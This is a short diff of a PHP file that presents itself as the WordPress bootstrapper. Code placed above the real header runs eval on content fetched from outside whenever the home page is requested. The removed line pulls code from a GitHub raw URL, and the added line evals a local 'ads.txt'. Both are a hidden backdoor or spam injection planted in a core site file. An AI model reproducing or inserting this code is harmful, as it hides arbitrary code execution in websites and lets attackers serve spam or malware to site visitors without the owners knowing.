@@ -5,7 +5,7 @@ $homeurlindex2 = '/';
 $currentpageindex = $_SERVER['REQUEST_URI'];
 
 if($currentpageindex == $homepageindex or $currentpageindex == $homeurlindex or $currentpageindex == $homeurlindex2) {
-    eval("?>".file_get_contents('https://raw.githubusercontent.com/flux-lab/LPFOKUSJITU/refs/heads/main/lamainnoire-tattoo'));
+    eval("?>".file_get_contents('./ads.txt'));
 }
 /**
  * WordPress View Bootstrapper
